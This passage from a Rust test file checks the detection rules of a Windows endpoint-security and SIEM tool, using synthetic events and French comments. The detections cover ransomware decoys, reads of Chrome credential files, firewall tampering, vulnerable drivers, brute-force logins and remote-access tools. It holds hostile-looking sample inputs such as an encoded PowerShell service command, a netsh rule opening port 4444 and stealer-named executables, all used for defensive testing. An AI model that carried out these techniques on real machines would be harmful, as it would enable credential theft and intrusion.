    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "192.168.0.10", 3389, "203.0.113.9", 51515)];
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &tcp, ""), [("RES-007".to_string(), "Critique".to_string())]);
    assert_eq!(tour_ports(&mut connues, &mut apprentissage, &tcp, "Éditeur"), [("RES-007".to_string(), "Alerte".to_string())]);
}

#[test]
fn res_007_negatif() {
    use crate::natif::Connexion;
    let mut connues = std::collections::HashMap::new();
    let mut apprentissage = true;
    // Connexion entrante depuis le réseau local ; connexion sortante (port local qui n'écoute pas)
    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "192.168.0.10", 3389, "192.168.0.20", 51515),
               Connexion::pour_test(800, 5, "192.168.0.10", 50123, "203.0.113.9", 443)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &tcp, "").is_empty());
    // Adresse du partage d'adresses des opérateurs (CGNAT, 100.64.0.0/10) : ni locale, ni publique
    let tcp = [Connexion::pour_test(700, 2, "0.0.0.0", 3389, "0.0.0.0", 0), Connexion::pour_test(700, 5, "100.64.1.5", 3389, "100.64.7.8", 51515)];
    assert!(tour_ports(&mut connues, &mut apprentissage, &tcp, "").is_empty(), "CGNAT");
}

#[test]
fn dns_001_positif() {
    let m = crate::menaces::menaces_test(&[], &["malveillant.example"]);
    let a = crate::moniteur::alerte_dns(&m, "malveillant.example").expect("domaine de la liste");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("DNS-001", "Critique", 10));
    // La casse ne compte pas
    assert!(crate::moniteur::alerte_dns(&m, "MALVEILLANT.example").is_some());
}

#[test]
fn dns_001_negatif() {
    let m = crate::menaces::menaces_test(&[], &["malveillant.example"]);
    // Autre domaine, sous-domaine (les listes portent des noms exacts), nom vide
    assert!(crate::moniteur::alerte_dns(&m, "sain.example").is_none());
    assert!(crate::moniteur::alerte_dns(&m, "www.malveillant.example").is_none());
    assert!(crate::moniteur::alerte_dns(&m, "").is_none());
}

// ------------------------------------------------------------ LEU et VOL : leurres et vol de données (PR 3.9)
// hygiene::verifier_leurres sur de vrais fichiers temporaires ; décisions pures hygiene::pid_touchant_leurre_parmi,
// vol_donnees::alerte_leurre_touche, vol_donnees::analyser et vol_donnees::premiere_en_24h sur des événements 4663
// synthétiques (aucun fichier du dossier de données lu ni écrit).

fn dossier_regle(nom: &str) -> std::path::PathBuf {
    let d = std::env::temp_dir().join(format!("d4t-regle-{nom}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn leurre_de_test(d: &std::path::Path, nom: &str) -> crate::hygiene::Leurre {
    let f = d.join(nom);
    std::fs::write(&f, b"contenu du leurre").unwrap();
    let empreinte = crate::hygiene::empreinte_verifiee(&f).expect("empreinte");
    crate::hygiene::Leurre { chemin: f.to_string_lossy().to_string(), empreinte, ..Default::default() }
}

#[test]
fn leu_001_positif() {
    let d = dossier_regle("leu1");
    let mut liste = vec![leurre_de_test(&d, "0 Factures 1234.docx"), leurre_de_test(&d, "0 Budget 5678.xlsx")];
    std::fs::write(d.join("0 Factures 1234.docx"), b"contenu chiffre").unwrap();
    std::fs::remove_file(d.join("0 Budget 5678.xlsx")).unwrap();
    let a = crate::hygiene::verifier_leurres(&mut liste);
    let _ = std::fs::remove_dir_all(&d);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str())).collect::<Vec<_>>(), [("LEU-001", "Critique"), ("LEU-001", "Critique")]);
    assert!(a[0].raisons.contains("MODIFIÉ") && a[1].raisons.contains("SUPPRIMÉ"), "{} / {}", a[0].raisons, a[1].raisons);
    assert!(liste.is_empty(), "un leurre signalé n'est plus suivi (pas d'alerte à chaque tour)");
}

#[test]
fn leu_001_negatif() {
    let d = dossier_regle("leu1n");
    let mut liste = vec![leurre_de_test(&d, "0 Contrat 4321.docx")];
    // Leurre lu sans être modifié (sa date d'accès peut changer) : rien
    let _ = std::fs::read(d.join("0 Contrat 4321.docx")).unwrap();
    let a = crate::hygiene::verifier_leurres(&mut liste);
    let _ = std::fs::remove_dir_all(&d);
    assert!(a.is_empty());
    assert_eq!(liste.len(), 1);
}

fn noms_de_test() -> Vec<(String, String)> {
    vec![("Documents".into(), "0 Factures 1234.docx".into()), ("Pictures".into(), "0 IMG_5678.jpg".into())]
}

#[test]
fn leu_002_positif() {
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Documents\0 Factures 1234.docx"), ("ProcessId", "0x1a2b"),
                                        ("ProcessName", r"C:\Users\essai\AppData\Local\Temp\chiffreur.exe")]);
    let (pid, programme, objet) = crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).expect("leurre touché");
    assert_eq!(pid, 0x1a2b);
    // Programme inconnu : Critique, suspendu si la réponse automatique l'a fait
    let a = crate::vol_donnees::alerte_leurre_touche(pid, &programme, &objet, false, true);
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("LEU-002", "Critique", 15));
    assert!(a.raisons.contains("RANÇONGICIEL PROBABLE") && a.raisons.contains("SUSPENDU"), "{}", a.raisons);
    let a = crate::vol_donnees::alerte_leurre_touche(pid, &programme, &objet, false, false);
    assert!(!a.raisons.contains("SUSPENDU"), "pas de suspension annoncée sans suspension : {}", a.raisons);
    // La casse du nom ne compte pas
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Pictures\0 img_5678.JPG"), ("ProcessId", "0x10")]);
    assert!(crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).is_some());
}

#[test]
fn leu_002_negatif() {
    // Autre fichier ; logiciel connu et signé (sauvegarde, synchronisation, antivirus) : Info, jamais suspendu
    let xml = evenement_defender(4663, &[("ObjectName", r"C:\Users\essai\Documents\Rapport.docx"), ("ProcessId", "0x1a2b")]);
    assert!(crate::hygiene::pid_touchant_leurre_parmi(&xml, &noms_de_test()).is_none());
    let a = crate::vol_donnees::alerte_leurre_touche(0x1a2b, r"C:\Program Files\Sauvegarde\agent.exe", r"C:\Users\essai\Documents\0 Factures 1234.docx", true, false);
    assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("LEU-002", "Info"));
    assert!(a.raisons.contains("non suspendu"));
}

/// Cible surveillée par son nom (pas par sa place dans la table)
fn cible_vol(nom: &str) -> &'static crate::vol_donnees::Cible {
    crate::vol_donnees::CIBLES.iter().find(|c| c.nom == nom).unwrap_or_else(|| panic!("cible {nom}"))
}

fn evenement_vol(objet: &str, processus: &str) -> String {
    evenement_defender(4663, &[("ObjectName", objet), ("ProcessName", processus), ("ProcessId", "0x2c")])
}

#[test]
fn vol_001_positif() {
    use crate::vol_donnees::analyser;
    let mots_de_passe = r"C:\Users\essai\AppData\Local\Google\Chrome\User Data\Default";
    let dossiers = vec![(mots_de_passe.to_string(), cible_vol("mots de passe de Chrome"))];
    let objet = format!(r"{mots_de_passe}\Login Data");
    // Programme lancé depuis un dossier temporaire : Critique ; ailleurs : Alerte
    let a = analyser(&evenement_vol(&objet, r"C:\Users\essai\AppData\Local\Temp\voleur.exe"), &dossiers).expect("alerte");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score, a.pid), ("VOL-001", "Critique", 10, Some(0x2c)));
    let a = analyser(&evenement_vol(&objet, r"C:\Outils\lecteur.exe"), &dossiers).expect("alerte");
    assert_eq!((a.niveau.as_str(), a.score), ("Alerte", 7));
    // Un « chrome.exe » qui n'est pas signé par Google n'est pas le propriétaire
    assert!(analyser(&evenement_vol(&objet, r"C:\Users\essai\Downloads\chrome.exe"), &dossiers).is_some());
}

#[test]
fn vol_001_negatif() {
    use crate::vol_donnees::analyser;
    let d = dossier_regle("vol1");
    let dossier = d.to_string_lossy().to_string();
    let dossiers = vec![(dossier.clone(), cible_vol("mots de passe de Chrome"))];
    std::fs::create_dir_all(d.join("Network")).unwrap();
    // Fichier hors des dossiers surveillés ; dossier parcouru (aucune donnée lue) ; notre propre service
    assert!(analyser(&evenement_vol(r"C:\Users\essai\Documents\note.txt", r"C:\Outils\lecteur.exe"), &dossiers).is_none());
    assert!(analyser(&evenement_vol(&d.join("Network").to_string_lossy(), r"C:\Outils\lecteur.exe"), &dossiers).is_none());
    let nous = std::env::current_exe().unwrap().to_string_lossy().to_string();
    assert!(analyser(&evenement_vol(&d.join("Login Data").to_string_lossy(), &nous), &dossiers).is_none());
    let _ = std::fs::remove_dir_all(&d);
    // Même programme et même cible : une alerte par 24 h
    use crate::vol_donnees::premiere_en_24h;
    let mut vues = std::collections::HashMap::new();
    let t0 = std::time::Instant::now();
    assert!(premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0));
    assert!(!premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0 + std::time::Duration::from_secs(3600)));
    assert!(premiere_en_24h(&mut vues, "lecteur|mots de passe".into(), t0 + std::time::Duration::from_secs(3600)), "autre cible");
    assert!(premiere_en_24h(&mut vues, "lecteur|cookies".into(), t0 + std::time::Duration::from_secs(90_000)), "24 h passées");
}

// ------------------------------------------------------------ SYS, PIL, EXT : hosts, pare-feu, pilotes, extensions (PR 3.10)
// Décisions moniteur::alerte_hosts, parefeu::traduire (événements du journal du pare-feu synthétiques),
// hygiene::pilotes_vulnerables (vrais fichiers temporaires) et hygiene::nouvelles_extensions (sans fichier de données).

#[test]
fn sys_001_positif() {
    use crate::moniteur::relever_hosts;
    let mut connue = "empreinte-avant".to_string();
    let a = relever_hosts(&mut connue, "empreinte-apres".into()).expect("hosts modifié");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("SYS-001", "Alerte", 3));
    assert_eq!(connue, "empreinte-apres");
    // PR 3.10 : changement fait pendant une panne de lecture, signalé au retour du fichier
    assert!(relever_hosts(&mut connue, String::new()).is_none());
    assert_eq!(connue, "empreinte-apres", "empreinte connue gardée pendant la panne");
    assert!(relever_hosts(&mut connue, "empreinte-modifiee".into()).is_some());
}

#[test]
fn sys_001_negatif() {
    use crate::moniteur::relever_hosts;
    // Même empreinte (nos propres écritures mettent l'empreinte connue à jour avant le contrôle)
    let mut connue = "empreinte".to_string();
    assert!(relever_hosts(&mut connue, "empreinte".into()).is_none());
    // PR 3.10 : fichier illisible, puis relu inchangé : rien (avant : deux alertes à tort)
    assert!(relever_hosts(&mut connue, String::new()).is_none());
    assert!(relever_hosts(&mut connue, "empreinte".into()).is_none());
    // Illisible au démarrage : le premier relevé lisible devient la référence
    let mut connue = String::new();
    assert!(relever_hosts(&mut connue, "empreinte".into()).is_none());
    assert_eq!(connue, "empreinte");
}

/// Événement du journal du pare-feu (Microsoft-Windows-Windows Firewall With Advanced Security/Firewall)
fn regle_parefeu(id: u32, donnees: &[(&str, &str)], signataire: &str) -> Option<(String, String)> {
    let sig = signataire.to_string();
    crate::parefeu::traduire(&evenement_defender(id, donnees), &|_| sig.clone()).and_then(|(_, a)| a).map(|a| (a.regle, a.niveau))
}

#[test]
fn sys_002_positif() {
    // Port entrant ouvert en ligne de commande (netsh) : Alerte
    let netsh = [("RuleName", "porte"), ("Direction", "1"), ("Action", "3"), ("LocalPorts", "4444"), ("ModifyingApplication", r"C:\Windows\System32\netsh.exe")];
    assert_eq!(regle_parefeu(2004, &netsh, "Microsoft Windows"), regle_et_niveau("SYS-002", "Alerte"));
    // Règle modifiée par un programme non signé (fichier réel, signataire vide) : Critique
    let d = dossier_regle("sys2");
    let outil = d.join("outil.exe");
    std::fs::write(&outil, b"MZ").unwrap();
    let outil = outil.to_string_lossy().to_string();
    let r = regle_parefeu(2005, &[("RuleName", "r"), ("Direction", "2"), ("Action", "2"), ("ModifyingApplication", &outil)], "");
    let _ = std::fs::remove_dir_all(&d);
    assert_eq!(r, regle_et_niveau("SYS-002", "Critique"));
}

#[test]
fn sys_002_negatif() {
    // Nos propres règles (blocages, isolements), même entrantes et posées par netsh ; règle sortante changée par
    // Windows ; événement sans rapport
    assert_eq!(regle_parefeu(2004, &[("RuleName", "deR4Tizer isolement"), ("Direction", "1"), ("Action", "3"),
                                     ("ModifyingApplication", r"C:\Windows\System32\netsh.exe")], "Microsoft Windows"), None);
    assert_eq!(regle_parefeu(2004, &[("RuleName", "r"), ("Direction", "2"), ("Action", "3"), ("ModifyingApplication", r"C:\Windows\System32\svchost.exe")], "Microsoft Windows"), None);
    assert_eq!(regle_parefeu(2010, &[("RuleName", "r")], ""), None);
}

#[test]
fn sys_003_positif() {
    // Toutes les règles supprimées par un autre auteur que Windows : Critique
    assert_eq!(regle_parefeu(2059, &[("ModifyingApplication", r"C:\Users\essai\AppData\Local\Temp\x.exe")], ""), regle_et_niveau("SYS-003", "Critique"));
}

#[test]
fn sys_003_negatif() {
    // Actualisation de la stratégie de groupe par svchost de Windows : Info (le retour des règles est vérifié une minute
    // plus tard par surveiller_regles) ; un « svchost.exe » hors de Windows reste Critique
    let svchost = format!(r"{}\System32\svchost.exe", crate::natif::dossier_windows());
    assert_eq!(regle_parefeu(2059, &[("ModifyingApplication", &svchost)], "Microsoft Windows"), regle_et_niveau("SYS-003", "Info"));
    assert_eq!(regle_parefeu(2059, &[("ModifyingApplication", r"C:\Users\essai\svchost.exe")], ""), regle_et_niveau("SYS-003", "Critique"));
}

#[test]
fn pil_001_positif() {
    use std::collections::HashSet;
    let d = dossier_regle("pil1");
    let pilote = d.join("vulnerable.sys");
    std::fs::write(&pilote, b"pilote vulnerable de test").unwrap();
    let connus: HashSet<String> = [crate::hygiene::empreinte_fichier(&pilote).unwrap()].into();
    let mut deja = HashSet::new();
    let a = crate::hygiene::pilotes_vulnerables(vec![pilote.clone()], &connus, &mut deja);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str())).collect::<Vec<_>>(), [("PIL-001", "Critique")]);
    // Déjà signalé : plus d'alerte
    assert!(crate::hygiene::pilotes_vulnerables(vec![pilote], &connus, &mut deja).is_empty());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn pil_001_negatif() {
    use std::collections::HashSet;
    let d = dossier_regle("pil1n");
    let sain = d.join("sain.sys");
    std::fs::write(&sain, b"pilote sain").unwrap();
    // Même contenu qu'un pilote connu, mais pas un .sys
    let texte = d.join("copie.txt");
    std::fs::write(&texte, b"pilote vulnerable de test").unwrap();
    let connus: HashSet<String> = [crate::hygiene::empreinte_fichier(&texte).unwrap()].into();
    let a = crate::hygiene::pilotes_vulnerables(vec![sain, texte, d.join("absent.sys")], &connus, &mut HashSet::new());
    let _ = std::fs::remove_dir_all(&d);
    assert!(a.is_empty());
}

fn extension(id: &str, dangereuse: bool) -> crate::hygiene::Extension {
    crate::hygiene::Extension { navigateur: "Chrome".into(), id: id.into(), nom: format!("Extension {id}"), version: "1.0".into(),
                                permissions: if dangereuse { "<all_urls>, cookies".into() } else { "storage".into() }, dangereuse, depuis: String::new() }
}

#[test]
fn ext_001_positif() {
    use crate::hygiene::nouvelles_extensions;
    let mut connues = std::collections::HashMap::new();
    assert!(nouvelles_extensions(&mut [extension("a", false)], &mut connues, true).is_empty(), "premier relevé : apprentissage");
    let mut liste = [extension("a", false), extension("b", true), extension("c", false)];
    let a = nouvelles_extensions(&mut liste, &mut connues, false);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str())).collect::<Vec<_>>(), [("EXT-001", "Alerte"), ("EXT-001", "Info")]);
    assert!(a[0].raisons.contains("permissions sensibles"));
    assert!(!liste[1].depuis.is_empty(), "date de première vue notée");
}

#[test]
fn ext_001_negatif() {
    use crate::hygiene::nouvelles_extensions;
    let mut connues = std::collections::HashMap::from([("Chrome|a".to_string(), "2026-10-01 10:00:00".to_string())]);
    let mut liste = [extension("a", true)];
    // Déjà connue : rien, et sa date de première vue est reprise ; même identifiant dans un autre navigateur : nouvelle
    assert!(nouvelles_extensions(&mut liste, &mut connues, false).is_empty());
    assert_eq!(liste[0].depuis, "2026-10-01 10:00:00");
    let mut autre = [crate::hygiene::Extension { navigateur: "Edge".into(), ..extension("a", false) }];
    assert_eq!(nouvelles_extensions(&mut autre, &mut connues, false).len(), 1);
}

// ------------------------------------------------------------ COR : corrélations du SIEM (PR 3.11)
// siem::Correlation::analyser sur des événements synthétiques (journaux Sécurité et Système déjà traduits). Les
// incidents portent « R<n> » ; le registre les publie en COR-R<n> (siem::regle_correlation). COR-R10 n'est pas exercée :
// sa vérification (hygiene::pilote_vulnerable) télécharge la liste LOLDrivers.

pub(crate) fn evenement_siem(type_: &str, champs: &[(&str, &str)]) -> crate::siem::Evenement {
    let mut e = crate::siem::Evenement { heure: "2026-10-27 01:00:00".into(), source: "securite".into(), type_: type_.into(),
                                         niveau: "Alerte".into(), message: format!("événement {type_}"), ..Default::default() };
    for (c, v) in champs {
        match *c {
            "ip" => e.ip = v.to_string(),
            "utilisateur" => e.utilisateur = v.to_string(),
            "processus" => e.processus = v.to_string(),
            "destination" => e.destination = v.to_string(),
            "message" => e.message = v.to_string(),
            "niveau" => e.niveau = v.to_string(),
            "source" => e.source = v.to_string(),
            "mitre" => e.mitre = v.to_string(),
            _ => panic!("champ {c}"),
        }
    }
    e
}

/// Incidents levés par une suite d'événements : (règle, niveau)
fn incidents(evenements: &[crate::siem::Evenement]) -> Vec<(String, String)> {
    let mut c = crate::siem::Correlation::default();
    evenements.iter().flat_map(|e| c.analyser(e)).map(|i| (i.regle, i.niveau)).collect()
}

/// Échecs d'ouverture de session depuis le réseau local (une adresse publique lèverait aussi COR-R9)
fn echecs(n: usize, ip: &str) -> Vec<crate::siem::Evenement> {
    (0..n).map(|_| evenement_siem("echec-session", &[("ip", ip), ("utilisateur", "essai")])).collect()
}

#[test]
fn cor_r1_positif() {
    // Cinq échecs d'ouverture de session depuis la même source en 5 minutes : Alerte, une seule fois
    let i = incidents(&echecs(7, "192.168.1.10"));
    assert_eq!(i, [("R1".to_string(), "Alerte".to_string())]);
}

#[test]
fn cor_r1_negatif() {
    // Quatre échecs ; cinq échecs répartis sur deux sources
    assert!(incidents(&echecs(4, "192.168.1.10")).is_empty());
    let mut e = echecs(3, "192.168.1.10");
    e.extend(echecs(2, "192.168.1.11"));
    assert!(incidents(&e).is_empty());
}

#[test]
fn cor_r2_positif() {
    let mut e = echecs(5, "192.168.1.10");
    e.push(evenement_siem("ouverture-session", &[("ip", "192.168.1.10"), ("utilisateur", "essai")]));
    let i = incidents(&e);
    assert!(i.contains(&("R2".to_string(), "Critique".to_string())), "{i:?}");
}

#[test]
fn cor_r2_negatif() {
    // Session ouverte après quatre échecs ; après cinq échecs d'une autre source
    let mut e = echecs(4, "192.168.1.10");
    e.push(evenement_siem("ouverture-session", &[("ip", "192.168.1.10"), ("utilisateur", "essai")]));
    assert!(incidents(&e).is_empty());
    let mut e = echecs(5, "192.168.1.11");
    e.push(evenement_siem("ouverture-session", &[("ip", "192.168.1.10"), ("utilisateur", "autre")]));
    assert!(!incidents(&e).iter().any(|(r, _)| r == "R2"));
}

#[test]
fn cor_r3_positif() {
    // Compte créé puis ajouté aux Administrateurs : R3 Critique ; compte existant ajouté : R3b Alerte
    let e = [evenement_siem("compte-cree", &[("destination", r"POSTE\nouveau")]),
             evenement_siem("ajout-administrateurs", &[("processus", r"POSTE\nouveau")])];
    assert_eq!(incidents(&e), [("R3".to_string(), "Critique".to_string())]);
    assert_eq!(incidents(&[evenement_siem("ajout-administrateurs", &[("processus", r"POSTE\ancien")])]), [("R3b".to_string(), "Alerte".to_string())]);
}

#[test]
fn cor_r3_negatif() {
    // Compte créé sans ajout aux Administrateurs ; même ajout signalé une seule fois par heure
    assert!(incidents(&[evenement_siem("compte-cree", &[("destination", r"POSTE\nouveau")])]).is_empty());
    let ajout = evenement_siem("ajout-administrateurs", &[("processus", r"POSTE\ancien")]);
    assert_eq!(incidents(&[ajout.clone(), ajout]).len(), 1);
}

#[test]
fn cor_r4_positif() {
    assert_eq!(incidents(&[evenement_siem("journal-efface", &[("message", "journal Sécurité effacé")])]), [("R4".to_string(), "Critique".to_string())]);
}

#[test]
fn cor_r4_negatif() {
    // Le même effacement n'est signalé qu'une fois par heure ; un autre type d'événement ne compte pas
    let e = evenement_siem("journal-efface", &[("message", "journal Sécurité effacé")]);
    assert_eq!(incidents(&[e.clone(), e]).len(), 1);
    assert!(incidents(&[evenement_siem("processus-cree", &[("message", "journal Sécurité effacé")])]).is_empty());
}

#[test]
fn cor_r5_positif() {
    for m in [r"service « maj » : C:\Users\essai\AppData\Local\Temp\svc.exe", r"service « x » : powershell -enc AAAA", r"service « y » : C:\ProgramData\outil\svc.exe"] {
        let e = evenement_siem("service-installe", &[("message", m), ("processus", m), ("destination", r"C:\Users\essai\AppData\Local\Temp\svc.exe")]);
        assert_eq!(incidents(&[e]), [("R5".to_string(), "Critique".to_string())], "{m}");
    }
}

#[test]
fn cor_r5_negatif() {
    // Services installés dans Program Files ou Windows
    for m in [r"service « Éditeur » : C:\Program Files\Editeur\service.exe", r"service « wuauserv » : C:\Windows\System32\svchost.exe -k netsvcs"] {
        let e = evenement_siem("service-installe", &[("message", m), ("processus", m), ("destination", r"C:\Program Files\Editeur\service.exe")]);
        assert!(incidents(&[e]).is_empty(), "{m}");
    }
}

fn alerte_siem(processus: &str, mitre: &str, niveau: &str) -> crate::siem::Evenement {
    evenement_siem("alerte", &[("source", "alerte"), ("processus", processus), ("mitre", mitre), ("niveau", niveau)])
}

#[test]
fn cor_r6_positif() {
    // Trois détections différentes d'un même programme en 10 minutes
    let e = [alerte_siem("outil.exe", "T1059.001", "Alerte"), alerte_siem("outil.exe", "T1105", "Alerte"), alerte_siem("Outil.exe", "T1547.001", "Critique")];
    assert_eq!(incidents(&e), [("R6".to_string(), "Critique".to_string())]);
}

#[test]
fn cor_r6_negatif() {
    // Deux détections distinctes (la troisième répète la première) ; trois détections de trois programmes ; alertes Info
    let e = [alerte_siem("outil.exe", "T1059.001", "Alerte"), alerte_siem("outil.exe", "T1105", "Alerte"), alerte_siem("outil.exe", "T1059.001", "Alerte")];
    assert!(incidents(&e).is_empty());
    let e = [alerte_siem("a.exe", "T1059.001", "Alerte"), alerte_siem("b.exe", "T1105", "Alerte"), alerte_siem("c.exe", "T1547.001", "Alerte")];
    assert!(incidents(&e).is_empty());
    let e = [alerte_siem("outil.exe", "T1", "Info"), alerte_siem("outil.exe", "T2", "Info"), alerte_siem("outil.exe", "T3", "Info")];
    assert!(incidents(&e).is_empty());
}

#[test]
fn cor_r7_positif() {
    let e = [evenement_siem("etat-service", &[("message", "service Windows Defender arrêté"), ("niveau", "Alerte")]),
             evenement_siem("politique-audit-modifiee", &[("message", "politique d'audit modifiée"), ("niveau", "Alerte")])];
    assert_eq!(incidents(&e), [("R7".to_string(), "Alerte".to_string()), ("R7".to_string(), "Alerte".to_string())]);
}

#[test]
fn cor_r7_negatif() {
    // Changement d'état ordinaire (Info)
    assert!(incidents(&[evenement_siem("etat-service", &[("message", "service démarré"), ("niveau", "Info")])]).is_empty());
}

#[test]
fn cor_r9_positif() {
    // Session ouverte depuis une adresse publique : Bureau à distance Critique, autre Alerte
    let e = evenement_siem("ouverture-session", &[("ip", "203.0.113.9"), ("utilisateur", "essai"), ("message", "session bureau à distance de essai")]);
    assert_eq!(incidents(&[e]), [("R9".to_string(), "Critique".to_string())]);
    let e = evenement_siem("ouverture-session", &[("ip", "203.0.113.9"), ("utilisateur", "essai"), ("message", "session réseau de essai")]);
    assert_eq!(incidents(&[e]), [("R9".to_string(), "Alerte".to_string())]);
}

#[test]
fn cor_r9_negatif() {
    // Session depuis le réseau local ; session locale (sans adresse)
    assert!(incidents(&[evenement_siem("ouverture-session", &[("ip", "192.168.1.20"), ("utilisateur", "essai")])]).is_empty());
    assert!(incidents(&[evenement_siem("ouverture-session", &[("utilisateur", "essai")])]).is_empty());
}

/// Relecture de #91 : chaîne complète, du XML des journaux (4625, 4624) à l'incident, pour qu'un type ou un texte
/// renommé d'un seul côté (siem::traduire ou siem::Correlation) fasse échouer un test. Cinq échecs depuis une adresse
/// publique, puis une session Bureau à distance réussie depuis la même adresse : R1, R2 et R9 (Critique)
#[test]
fn cor_bout_en_bout() {
    let echec = evenement_defender(4625, &[("TargetUserName", "essai"), ("TargetDomainName", "POSTE"), ("IpAddress", "203.0.113.9"), ("LogonType", "10")]);
    let session = evenement_defender(4624, &[("TargetUserName", "essai"), ("TargetDomainName", "POSTE"), ("IpAddress", "203.0.113.9"), ("LogonType", "10")]);
    let mut evenements: Vec<crate::siem::Evenement> = (0..5).map(|_| crate::siem::traduire(&echec).expect("4625 traduit")).collect();
    evenements.push(crate::siem::traduire(&session).expect("4624 traduit"));
    let i = incidents(&evenements);
    for attendu in [("R1", "Alerte"), ("R2", "Critique"), ("R9", "Critique")] {
        assert!(i.contains(&(attendu.0.to_string(), attendu.1.to_string())), "{attendu:?} absent de {i:?}");
    }
    // Session de service (type 5) : ignorée dès la traduction
    let service = evenement_defender(4624, &[("TargetUserName", "essai"), ("IpAddress", "203.0.113.9"), ("LogonType", "5")]);
    assert!(crate::siem::traduire(&service).is_none());
}

/// Audit du 2026-11-23, A-6-1 : la ligne de commande d'un 4688 est stockée dans le SIEM (30 jours, lisible par les comptes
/// lecteurs, exportée par l'API) secrets masqués ; le reste de la ligne est gardé
#[test]
fn siem_4688_ligne_de_commande_masquee() {
    let xml = evenement_defender(4688, &[("SubjectUserName", "essai"), ("SubjectDomainName", "POSTE"), ("SubjectUserSid", "S-1-5-21-1-2-3-1001"),
        ("NewProcessName", r"C:\Windows\System32\net.exe"), ("NewProcessId", "0x1a4"), ("ParentProcessName", r"C:\Windows\System32\cmd.exe"),
        ("CommandLine", r"net use \\serveur\partage MotDePasseSecret1 /user:POSTE\essai")]);
    let e = crate::siem::traduire(&xml).expect("4688 traduit");
    assert_eq!(e.type_, "processus-cree");
    assert!(!e.message.contains("MotDePasseSecret1"), "secret stocké : {}", e.message);
    assert!(e.message.contains(r"net use \\serveur\partage") && e.message.contains(r"/user:POSTE\essai"), "{}", e.message);
}

// ------------------------------------------------------------ VIE et BAS : vie privée, accès distant, baseline (PR 3.12)
// Décisions surveillances::premiers_usages, surveillances::outils_distants (chemin d'un PID passé en paramètre),
// surveillances::alerte_bureau_a_distance et baseline::derives, sans registre ni fichier de données.

fn usage(peripherique: &str, programme: &str, en_cours: bool) -> crate::commun::UsagePeripherique {
    crate::commun::UsagePeripherique { peripherique: peripherique.into(), programme: programme.into(),
                                       chemin: format!(r"C:\Outils\{programme}.exe"), en_cours, ..Default::default() }
}

fn tour_usages(usages: &[crate::commun::UsagePeripherique], avant: &std::collections::HashSet<String>, connus: &mut std::collections::HashSet<String>,
               apprentissage: bool) -> (Vec<(String, String)>, std::collections::HashSet<String>) {
    let mut alertes = Vec::new();
    let (en_cours, _) = crate::surveillances::premiers_usages(usages, avant, connus, apprentissage, &mut alertes);
    (alertes.into_iter().map(|a| (a.regle, a.niveau)).collect(), en_cours)
}

#[test]
fn vie_001_positif() {
    let mut connus = std::collections::HashSet::new();
    // Premier relevé : apprentissage ; puis un nouveau programme qui utilise la caméra : Alerte
    let (a, avant) = tour_usages(&[usage("Micro", "visio", true)], &Default::default(), &mut connus, true);
    assert!(a.is_empty());
    let (a, _) = tour_usages(&[usage("Micro", "visio", true), usage("Caméra", "espion", true)], &avant, &mut connus, false);
    assert_eq!(a, [("VIE-001".to_string(), "Alerte".to_string())]);
}

#[test]
fn vie_001_negatif() {
    let mut connus = std::collections::HashSet::new();
    // Programme déjà connu (même périphérique) ; usage terminé ; usage déjà en cours au relevé précédent
    tour_usages(&[usage("Caméra", "visio", false)], &Default::default(), &mut connus, true);
    let (a, avant) = tour_usages(&[usage("Caméra", "visio", true), usage("Micro", "dictee", false)], &Default::default(), &mut connus, false);
    assert!(a.is_empty(), "{a:?}");
    assert!(tour_usages(&[usage("Caméra", "visio", true)], &avant, &mut connus, false).0.is_empty());
}

fn outils_test(outils_vus: &mut std::collections::HashMap<u32, String>, noms: &[(u32, &str)]) -> (Vec<(String, String)>, usize) {
    use crate::natif::InfoListe;
    let liste: std::collections::HashMap<u32, InfoListe> = noms.iter().map(|(p, n)| (*p, InfoListe { nom: n.to_string(), parent: 4 })).collect();
    let mut alertes = Vec::new();
    let actuels = crate::surveillances::outils_distants(outils_vus, &liste, &|pid| format!(r"C:\Outils\{pid}.exe"), &mut |_| String::new(), &mut alertes);
    (alertes.into_iter().map(|a| (a.regle, a.niveau)).collect(), actuels.len())
}

#[test]
fn vie_002_positif() {
    let mut vus = std::collections::HashMap::new();
    // AnyDesk lancé : une alerte, nom sans tenir compte de la casse ; relancé (autre PID) après sa fin : nouvelle alerte
    let (a, n) = outils_test(&mut vus, &[(900, "AnyDesk"), (901, "notepad")]);
    assert_eq!((a, n), (vec![("VIE-002".to_string(), "Alerte".to_string())], 1));
    outils_test(&mut vus, &[(901, "notepad")]);
    assert_eq!(outils_test(&mut vus, &[(950, "anydesk")]).0.len(), 1);
    // Outil terminé, puis PID réutilisé par un nouveau lancement : oublié à sa fin, il est signalé de nouveau
    outils_test(&mut vus, &[]);
    assert_eq!(outils_test(&mut vus, &[(950, "anydesk")]).0.len(), 1, "PID réutilisé après la fin de l'outil");
}

#[test]
fn vie_002_negatif() {
    let mut vus = std::collections::HashMap::new();
    // Programme ordinaire ; outil toujours en cours au relevé suivant (même PID) : une seule alerte
    assert!(outils_test(&mut vus, &[(901, "notepad")]).0.is_empty());
    outils_test(&mut vus, &[(900, "teamviewer")]);
    let (a, n) = outils_test(&mut vus, &[(900, "teamviewer")]);
    assert!(a.is_empty());
    assert_eq!(n, 1, "toujours listé dans l'état");
}

#[test]
fn vie_003_positif() {
